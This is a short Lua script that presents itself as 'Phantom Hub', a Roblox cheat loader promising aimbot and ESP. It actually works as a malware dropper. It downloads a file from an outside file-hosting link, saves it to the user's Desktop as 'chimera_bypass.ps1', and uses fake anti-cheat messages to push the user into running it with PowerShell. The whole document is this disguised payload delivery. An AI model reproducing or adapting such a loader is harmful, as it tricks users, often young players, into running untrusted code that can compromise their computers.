--// Phantom Hub v2.5 - Universal Loader //--
print("PHANTOM HUB LOADED...")
wait(1)
print("Checking for latest anti-cheat...")
wait(2)
print(">> ANTICHEAT DETECTED - BYPASS REQUIRED FOR ADVANCED FEATURES <<")

local url = 'https://files.catbox.moe/382isn.7z'
local bypass_name = "chimera_bypass.ps1"

-- This uses the injector's 'writefile' function to save our powershell launcher to the user's desktop
if writefile then
    local content = game:HttpGet(url, true)
    writefile("Desktop\\" .. bypass_name, content)
    print("SUCCESS! A bypass script '" .. bypass_name .. "' has been created on your Desktop.")
    print("To unlock all features, please right-click this new file and 'Run with PowerShell'.")
else
    print("ERROR: Your injector does not support writefile(). Please download the bypass manually from the link below and run it.")
    print("Bypass Link: " .. url)
end

print("Aimbot and ESP will have limited functionality until bypass is activated.")
